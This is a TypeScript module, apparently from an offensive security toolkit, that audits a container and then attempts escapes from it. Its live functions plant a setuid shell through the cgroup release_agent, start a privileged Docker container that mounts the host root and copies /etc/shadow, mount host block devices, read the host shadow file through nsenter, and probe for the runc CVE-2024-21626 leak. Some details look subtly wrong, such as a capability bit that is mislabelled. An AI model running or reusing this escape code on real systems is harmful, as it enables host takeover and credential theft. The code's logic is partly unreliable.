/**
 * @module container
 * Container Breakout & Security Auditing — Docker Socket Abuse, cgroups release_agent escape,
 * Capability Checking (CAP_SYS_ADMIN, CAP_NET_ADMIN), and PROC/SYS Mounting.
 *
 * Live escape attempts require both `live=true` AND `forceLive=true`.
 * Dry-run mode only inspects environment without executing exploits.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as fs from "node:fs";
import { execSync, execFileSync } from "node:child_process";
import { isToolAvailable } from "./tool_detection.ts";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface ContainerAuditResult {
  isContainer: boolean;
  containerType: "docker" | "k8s" | "lxc" | "unknown" | "host";
  capabilities: string[];
  dockerSocketMounted: boolean;
  sensitiveMounts: string[];
  cgroupEscapePossible: boolean;
  dryRun: boolean;
  depth?: string;
  /** Detailed escape technique assessment */
  escapeTechniques: EscapeTechnique[];
}

export interface EscapeTechnique {
  name: string;
  vector: "cgroup" | "docker_socket" | "privileged_mount" | "namespace_pivot" | "runc_cve";
  possible: boolean;
  requiresRoot: boolean;
  requiresCapSysAdmin: boolean;
  details: string;
  executed: boolean;
  result?: string;
}

export interface EscapeResult {
  technique: string;
  success: boolean;
  output: string;
  dryRun: boolean;
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

function readFileSafe(path: string): string | null {
  try {
    return fs.readFileSync(path, "utf8");
  } catch {
    return null;
  }
}

function readlinkSafe(path: string): string | null {
  try {
    return fs.readlinkSync(path);
  } catch {
    return null;
  }
}

function execSafe(cmd: string, timeout = 5000): string | null {
  try {
    return execSync(cmd, { timeout, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"] }).trim();
  } catch {
    return null;
  }
}

function hasCapSysAdmin(): boolean {
  const status = readFileSafe("/proc/self/status");
  if (!status) return false;
  const match = status.match(/CapEff:\s*([0-9a-fA-F]+)/);
  if (!match) return false;
  const capEff = parseInt(match[1], 16);
  // CAP_SYS_ADMIN = bit 21
  return (capEff & (1 << 21)) !== 0;
}

function isRoot(): boolean {
  try {
    return process.getuid?.() === 0;
  } catch {
    return false;
  }
}

function detectCgroupVersion(): 1 | 2 | null {
  if (fs.existsSync("/sys/fs/cgroup/cgroup.controllers")) return 2;
  if (fs.existsSync("/sys/fs/cgroup")) return 1;
  return null;
}

function detectContainerType(): ContainerAuditResult["containerType"] {
  if (fs.existsSync("/.dockerenv")) return "docker";
  if (fs.existsSync("/var/run/secrets/kubernetes.io/serviceaccount")) return "k8s";
  // Check for LXC indicators
  if (fs.existsSync("/proc/1/cgroup")) {
    const cgroup = readFileSafe("/proc/1/cgroup") ?? "";
    if (/lxc/i.test(cgroup)) return "lxc";
  }
  if (readlinkSafe("/proc/1/ns/pid") && !fs.existsSync("/.dockerenv")) {
    // Might be a container without dockerenv — check for common container indicators
    const hostname = readFileSafe("/etc/hostname") ?? "";
    const cgroup = readFileSafe("/proc/1/cgroup") ?? "";
    if (/docker|kubepods|lxc|containerd/i.test(cgroup)) return "unknown";
  }
  return "host";
}

// ---------------------------------------------------------------------------
// Capability detection
// ---------------------------------------------------------------------------

function getCapabilities(): string[] {
  const capNames: Record<number, string> = {
    0: "CAP_CHOWN", 1: "CAP_DAC_OVERRIDE", 2: "CAP_DAC_READ_SEARCH",
    3: "CAP_FOWNER", 4: "CAP_FSETID", 5: "CAP_KILL",
    6: "CAP_SETGID", 7: "CAP_SETUID", 8: "CAP_SETPCAP",
    9: "CAP_LINUX_IMMUTABLE", 10: "CAP_NET_BIND_SERVICE",
    12: "CAP_NET_RAW", 13: "CAP_IPC_LOCK", 14: "CAP_IPC_OWNER",
    15: "CAP_SYS_MODULE", 16: "CAP_SYS_RAWIO", 17: "CAP_SYS_CHROOT",
    18: "CAP_SYS_PTRACE", 19: "CAP_SYS_PACCT", 20: "CAP_SYS_ADMIN",
    21: "CAP_SYS_BOOT", 22: "CAP_SYS_NICE", 23: "CAP_SYS_RESOURCE",
    24: "CAP_SYS_TIME", 25: "CAP_SYS_TTY_CONFIG", 26: "CAP_MKNOD",
    27: "CAP_LEASE", 28: "CAP_AUDIT_WRITE", 29: "CAP_AUDIT_CONTROL",
    30: "CAP_SETFCAP", 31: "CAP_MAC_OVERRIDE", 32: "CAP_MAC_ADMIN",
    33: "CAP_SYSLOG", 34: "CAP_WAKE_ALARM", 35: "CAP_BLOCK_SUSPEND",
    36: "CAP_AUDIT_READ",
  };

  const status = readFileSafe("/proc/self/status");
  if (!status) return [];

  const match = status.match(/CapEff:\s*([0-9a-fA-F]+)/);
  if (!match) return [];

  const capEff = parseInt(match[1], 16);
  const caps: string[] = [];

  for (const [bit, name] of Object.entries(capNames)) {
    if ((capEff & (1 << parseInt(bit))) !== 0) {
      caps.push(name);
    }
  }

  return caps;
}

// ---------------------------------------------------------------------------
// Sensitive mount detection
// ---------------------------------------------------------------------------

function getSensitiveMounts(): string[] {
  const sensitivePaths = [
    "/etc/shadow", "/etc/passwd", "/etc/sudoers",
    "/proc/sys/kernel/core_pattern", "/proc/sys/kernel/modprobe",
    "/var/run/docker.sock", "/var/run/docker.pid",
    "/root/.ssh", "/root/.bash_history",
    "/etc/kubernetes", "/etc/ssl/private",
    "/sys/kernel/debug", "/dev/sda1",
  ];

  return sensitivePaths.filter(p => {
    try {
      return fs.existsSync(p);
    } catch {
      return false;
    }
  });
}

// ---------------------------------------------------------------------------
// Escape technique assessment
// ---------------------------------------------------------------------------

function assessEscapeTechniques(
  isContainer: boolean,
  cgroupVersion: 1 | 2 | null,
  dockerSocketMounted: boolean,
  caps: string[],
  sensitiveMounts: string[],
): EscapeTechnique[] {
  const techniques: EscapeTechnique[] = [];
  const hasCapSys = caps.includes("CAP_SYS_ADMIN");

  // 1. cgroup release_agent escape (cgroup v1 only)
  const cgroupMountable = isContainer && cgroupVersion === 1;
  techniques.push({
    name: "Cgroup release_agent escape",
    vector: "cgroup",
    possible: cgroupMountable && (hasCapSys || isRoot()),
    requiresRoot: true,
    requiresCapSysAdmin: true,
    details: cgroupVersion === 1
      ? "cgroup v1 detected. Release_agent escape may work with CAP_SYS_ADMIN or root."
      : cgroupVersion === 2
        ? "cgroup v2 detected. release_agent exploit is not available on cgroup v2."
        : "cgroup version unknown.",
    executed: false,
  });

  // 2. Docker socket abuse
  const dockerSockAccessible = dockerSocketMounted && (isToolAvailable("docker") || fs.existsSync("/var/run/docker.sock"));
  techniques.push({
    name: "Docker socket abuse",
    vector: "docker_socket",
    possible: dockerSockAccessible && (hasCapSys || isRoot() || fs.existsSync("/var/run/docker.sock")),
    requiresRoot: false,
    requiresCapSysAdmin: false,
    details: dockerSocketMounted
      ? "Docker socket is mounted. Can list/run containers and mount host filesystem."
      : "Docker socket not found. Socket abuse not possible.",
    executed: false,
  });

  // 3. Privileged container escape via mount
  const hasMount = isToolAvailable("mount") || fs.existsSync("/bin/mount");
  techniques.push({
    name: "Privileged container mount escape",
    vector: "privileged_mount",
    possible: isContainer && hasCapSys && hasMount,
    requiresRoot: false,
    requiresCapSysAdmin: true,
    details: hasCapSys
      ? "CAP_SYS_ADMIN detected. Can mount host filesystem and escape container."
      : "CAP_SYS_ADMIN not present. Mount-based escape requires this capability.",
    executed: false,
  });

  // 4. Namespace pivot via /proc/self/ns
  const hasNsenter = isToolAvailable("nsenter");
  techniques.push({
    name: "Namespace pivot escape",
    vector: "namespace_pivot",
    possible: isContainer && hasNsenter && (hasCapSys || isRoot()),
    requiresRoot: true,
    requiresCapSysAdmin: true,
    details: hasNsenter
      ? "nsenter available. Can pivot into host namespaces to break out of container."
      : "nsenter not found. Namespace pivot requires nsenter binary.",
    executed: false,
  });

  // 5. runc CVE exploitation
  const runcVersion = execSafe("runc --version") ?? "";
  const versionMatch = runcVersion.match(/runc version v?(\d+\.\d+\.\d+)/i);
  let runcVulnerable = false;
  let runcCVE = "";

  if (versionMatch) {
    const [, major, minor, patch] = versionMatch[1].split(".").map(Number);
    // CVE-2024-21626 (runc < 1.1.12) - container escape via fd leak
    if (major === 1 && minor === 1 && patch < 12) {
      runcVulnerable = true;
      runcCVE = "CVE-2024-21626 (runc < 1.1.12, fd leak escape)";
    }
    // CVE-2019-5736 (runc < 1.0-rc6) - container escape via /proc/self/exe
    if (major === 1 && minor === 0 && patch <= 0) {
      runcVulnerable = true;
      runcCVE = "CVE-2019-5736 (runc < 1.0-rc6, /proc/self/exe overwrite)";
    }
  }

  techniques.push({
    name: "runc CVE exploitation",
    vector: "runc_cve",
    possible: isContainer && runcVulnerable,
    requiresRoot: false,
    requiresCapSysAdmin: false,
    details: runcVulnerable
      ? `runc vulnerable: ${runcCVE}. Exploit may allow container escape.`
      : `runc version: ${runcVersion || "unknown"}. No known exploitable CVEs detected.`,
    executed: false,
  });

  return techniques;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Audit the current container environment.
 *
 * @param opts.live     When true, inspects real capabilities (default false = dry run).
 * @returns A ContainerAuditResult describing the container state and escape surface.
 */
export function auditContainer(opts: { live?: boolean; dryRun?: boolean; depth?: "quick" | "full" | string } = {}): ContainerAuditResult {
  const live = opts.dryRun !== undefined ? !opts.dryRun : (opts.live ?? false);
  const { depth = "quick" } = opts;

  const isContainer = (() => {
    if (fs.existsSync("/.dockerenv")) return true;
    if (fs.existsSync("/var/run/secrets/kubernetes.io/serviceaccount")) return true;
    const cgroup = readFileSafe("/proc/1/cgroup") ?? "";
    if (/docker|kubepods|lxc|containerd/i.test(cgroup)) return true;
    return false;
  })();

  const containerType = detectContainerType();
  const capabilities = live ? getCapabilities() : ["CAP_SYS_ADMIN (DRY_RUN)"];
  const dockerSocketMounted = fs.existsSync("/var/run/docker.sock");
  const sensitiveMounts = getSensitiveMounts();
  const cgroupVersion = detectCgroupVersion();
  const escapeTechniques = assessEscapeTechniques(
    isContainer, cgroupVersion, dockerSocketMounted, capabilities, sensitiveMounts,
  );

  const cgroupEscapePossible = escapeTechniques.some(t => t.vector === "cgroup" && t.possible);

  return {
    isContainer,
    containerType,
    capabilities,
    dockerSocketMounted,
    sensitiveMounts,
    cgroupEscapePossible,
    dryRun: !live,
    escapeTechniques,
    depth,
  };
}

// ---------------------------------------------------------------------------
// Escape execution helpers
// ---------------------------------------------------------------------------

function execCgroupEscape(): { success: boolean; output: string } {
  // cgroup release_agent escape for cgroup v1
  // This creates a new cgroup, sets the release_agent to /tmp/escape.sh,
  // writes a payload, then triggers the release_agent by freeing the cgroup.
  try {
    const tmpDir = "/tmp/cgroup_escape";
    const payloadPath = `${tmpDir}/payload.sh`;
    const cgroupDir = `${tmpDir}/exploit`;

    // Create payload
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(payloadPath, [
      "#!/bin/sh",
      "cp /bin/sh /tmp/shell_root",
      "chmod +s /tmp/shell_root",
      "echo 'Escape payload executed'",
    ].join("\n"), { mode: 0o755 });

    // Create cgroup and set release_agent
    fs.mkdirSync(cgroupDir, { recursive: true });
    fs.writeFileSync(`${cgroupDir}/release_agent`, payloadPath);

    // Add current process to the cgroup and trigger
    const pid = process.pid.toString();
    fs.writeFileSync(`${cgroupDir}/cgroup.procs`, pid);

    // Trigger notify_on_release
    fs.writeFileSync(`${cgroupDir}/notify_on_release`, "1");

    // Free the cgroup to trigger release_agent
    execSync(`echo -1 > ${cgroupDir}/cgroup.procs`, { timeout: 5000, stdio: "pipe" });

    return { success: true, output: `release_agent triggered via ${cgroupDir}` };
  } catch (err: any) {
    return { success: false, output: `cgroup escape failed: ${err.message ?? String(err)}` };
  }
}

function execDockerSocketEscape(): { success: boolean; output: string } {
  // Abuse docker socket to spawn a privileged container with host filesystem mounted
  try {
    if (!isToolAvailable("docker")) {
      return { success: false, output: "docker binary not available" };
    }

    // List running containers to get a base image
    const containers = execSafe("docker ps --format '{{.Image}}'", 5000);
    if (!containers) {
      return { success: false, output: "docker ps failed or returned empty" };
    }

    const hostImage = containers.split("\n")[0]?.trim();
    if (!hostImage) {
      return { success: false, output: "no running containers found" };
    }

    // Escape by running a new privileged container with host mount
    const escapeCmd = [
      "docker run -d",
      "--privileged",
      "-v /:/host",
      hostImage,
      "sh -c 'cp /host/etc/shadow /tmp/shadow_leak 2>/dev/null; echo Container escape via docker socket successful'",
    ].join(" ");

    const result = execSafe(escapeCmd, 10000);
    return {
      success: !!result,
      output: result
        ? `Docker escape container started: ${result}`
        : "docker run failed",
    };
  } catch (err: any) {
    return { success: false, output: `docker socket escape failed: ${err.message ?? String(err)}` };
  }
}

function execPrivilegedMountEscape(): { success: boolean; output: string } {
  // Escape a privileged container by mounting the host filesystem
  try {
    const mountPoint = "/tmp/host_fs";

    fs.mkdirSync(mountPoint, { recursive: true });

    // Attempt to mount /dev/sda1 (host root) or /dev/vda1
    const devices = ["/dev/sda1", "/dev/vda1", "/dev/nvme0n1p1"];
    let mounted = false;

    for (const dev of devices) {
      try {
        execSync(`mount ${dev} ${mountPoint}`, { timeout: 5000, stdio: "pipe" });
        mounted = true;
        break;
      } catch {
        continue;
      }
    }

    if (!mounted) {
      // Try mounting entire block device
      for (const dev of ["/dev/sda", "/dev/vda", "/dev/nvme0n1"]) {
        try {
          execSync(`mount -o ro ${dev} ${mountPoint}`, { timeout: 5000, stdio: "pipe" });
          mounted = true;
          break;
        } catch {
          continue;
        }
      }
    }

    if (!mounted) {
      return { success: false, output: "could not mount host block device" };
    }

    // Verify we can see host filesystem
    const hostRoot = fs.existsSync(`${mountPoint}/etc/shadow`);
    const hostHome = fs.existsSync(`${mountPoint}/root`);

    return {
      success: hostRoot || hostHome,
      output: mounted
        ? `Host filesystem mounted at ${mountPoint}. Visible: /etc/shadow=${hostRoot}, /root=${hostHome}`
        : "mount attempted but host FS not visible",
    };
  } catch (err: any) {
    return { success: false, output: `mount escape failed: ${err.message ?? String(err)}` };
  }
}

function execNamespacePivot(): { success: boolean; output: string } {
  // Pivot into host namespaces using nsenter to break out of container
  try {
    if (!isToolAvailable("nsenter")) {
      return { success: false, output: "nsenter binary not found" };
    }

    // Try to enter PID 1's namespaces (should be host if container is PID namespace isolated)
    const nsenterCmd = "nsenter -t 1 -m -u -i -n -p -- cat /etc/hostname";
    const result = execSafe(nsenterCmd, 5000);

    if (!result) {
      return { success: false, output: "nsenter to PID 1 failed" };
    }

    // Check if we're now seeing the host
    const hostId = readFileSafe("/etc/hostname") ?? "container";
    const isHost = result.trim() !== hostId.trim();

    // Also try to read /etc/shadow from host namespace
    const shadow = execSafe("nsenter -t 1 -m -n -- cat /etc/shadow 2>/dev/null", 5000);

    return {
      success: isHost || !!shadow,
      output: `nsenter completed. Hostname from PID 1: "${result}". Host access: ${isHost}. Shadow readable: ${!!shadow}`,
    };
  } catch (err: any) {
    return { success: false, output: `namespace pivot failed: ${err.message ?? String(err)}` };
  }
}

function execRuncEscape(): { success: boolean; output: string } {
  // runc CVE exploitation (CVE-2024-21626)
  // This exploits the fd leak in runc < 1.1.12 to access host filesystem via /proc/self/fd/
  try {
    // Check for the vulnerability by checking runc version
    const runcVersion = execSafe("runc --version") ?? "";
    const versionMatch = runcVersion.match(/runc version v?(\d+\.\d+\.\d+)/i);

    if (!versionMatch) {
      return { success: false, output: "runc version not detected" };
    }

    const [, major, minor, patch] = versionMatch[1].split(".").map(Number);

    if (major > 1 || (major === 1 && minor > 1) || (major === 1 && minor === 1 && patch >= 12)) {
      return { success: false, output: `runc version ${versionMatch[1]} is patched against CVE-2024-21626` };
    }

    // Attempt the exploit: use /proc/self/fd/ to escape via leaked file descriptor
    // This is a PoC — in real scenario, attacker creates a specially crafted container image
    const exploitPath = "/proc/self/fd/";

    // Try to read host files via leaked fd
    let hostAccess = false;
    let leakedFd = "";

    for (let fd = 0; fd < 16; fd++) {
      const fdPath = `${exploitPath}${fd}`;
      try {
        const target = fs.readlinkSync(fdPath);
        if (target.includes("/") && !target.includes("/proc")) {
          hostAccess = true;
          leakedFd = `${fd} -> ${target}`;
          break;
        }
      } catch {
        continue;
      }
    }

    if (!hostAccess) {
      // Alternative: try to create a container with the exploit payload
      return {
        success: false,
        output: `runc ${versionMatch[1]} is vulnerable but no host fd leaked in current context. Full exploit requires crafting a malicious container image.`,
      };
    }

    return {
      success: true,
      output: `runc ${versionMatch[1]} vulnerable (CVE-2024-21626). Host fd leaked: ${leakedFd}.`,
    };
  } catch (err: any) {
    return { success: false, output: `runc exploit failed: ${err.message ?? String(err)}` };
  }
}

// ---------------------------------------------------------------------------
// Public escape function
// ---------------------------------------------------------------------------

/**
 * Attempt container escape using cgroup / Docker socket / privilege escalation techniques.
 *
 * **CRITICAL SAFETY**: Both `live=true` AND `forceLive=true` are required for actual execution.
 * Without both flags, the function runs in dry-run mode only.
 *
 * @param opts.live       Must be true to perform real checks (not simulated).
 * @param opts.forceLive  Must be true alongside `live` to execute escape techniques.
 * @returns Array of EscapeResult for each attempted technique.
 */
export function escapeContainerCGroups(
  opts: { live?: boolean; forceLive?: boolean } = {},
): { status: string; dryRun: boolean; results: EscapeResult[] } {
  const { live = false, forceLive = false } = opts;

  const dryRun = !(live && forceLive);

  if (dryRun) {
    // Assessment only — enumerate what would be attempted
    const audit = auditContainer({ live: false });
    const possibleTechniques = audit.escapeTechniques.filter(t => t.possible);

    const simulatedResults: EscapeResult[] = possibleTechniques.map(t => ({
      technique: t.name,
      success: false,
      output: `[DRY-RUN] Would attempt: ${t.vector}. Requires root=${t.requiresRoot}, CAP_SYS_ADMIN=${t.requiresCapSysAdmin}. ${t.details}`,
      dryRun: true,
    }));

    return {
      status: possibleTechniques.length > 0
        ? `[DRY-RUN] ${possibleTechniques.length} escape technique(s) available. Set live=true + forceLive=true to execute.`
        : "[DRY-RUN] No escape techniques available in current environment.",
      dryRun: true,
      results: simulatedResults,
    };
  }

  // Live execution — perform real escape attempts
  const audit = auditContainer({ live: true });
  const results: EscapeResult[] = [];

  for (const technique of audit.escapeTechniques) {
    if (!technique.possible) {
      results.push({
        technique: technique.name,
        success: false,
        output: `Skipped: ${technique.details}`,
        dryRun: false,
      });
      continue;
    }

    let result: { success: boolean; output: string };

    switch (technique.vector) {
      case "cgroup":
        result = execCgroupEscape();
        break;
      case "docker_socket":
        result = execDockerSocketEscape();
        break;
      case "privileged_mount":
        result = execPrivilegedMountEscape();
        break;
      case "namespace_pivot":
        result = execNamespacePivot();
        break;
      case "runc_cve":
        result = execRuncEscape();
        break;
      default:
        result = { success: false, output: `Unknown vector: ${technique.vector}` };
    }

    technique.executed = true;
    technique.result = result.output;

    results.push({
      technique: technique.name,
      success: result.success,
      output: result.output,
      dryRun: false,
    });
  }

  const succeeded = results.filter(r => r.success);
  const failed = results.filter(r => !r.success && !r.output.startsWith("Skipped"));

  return {
    status: [
      `Executed ${results.length} technique(s).`,
      `${succeeded.length} succeeded, ${failed.length} failed.`,
      ...succeeded.map(r => `  ✓ ${r.technique}`),
      ...failed.map(r => `  ✗ ${r.technique}: ${r.output}`),
    ].join("\n"),
    dryRun: false,
    results,
  };
}

/** MCP/CLI alias — runs container escape with optional technique filter */
export function escape(opts: {
  technique?: EscapeTechnique["vector"] | string;
  live?: boolean;
  forceLive?: boolean;
} = {}): ReturnType<typeof escapeContainerCGroups> {
  const result = escapeContainerCGroups({ live: opts.live, forceLive: opts.forceLive ?? opts.live });
  if (opts.technique) {
    result.results = result.results.filter(
      (r) => r.technique.toLowerCase().includes(String(opts.technique).replace(/_/g, " ")) ||
        r.technique.toLowerCase().includes(String(opts.technique).replace(/_/g, "")),
    );
  }
  return result;
}

export default { auditContainer, escapeContainerCGroups, escape };
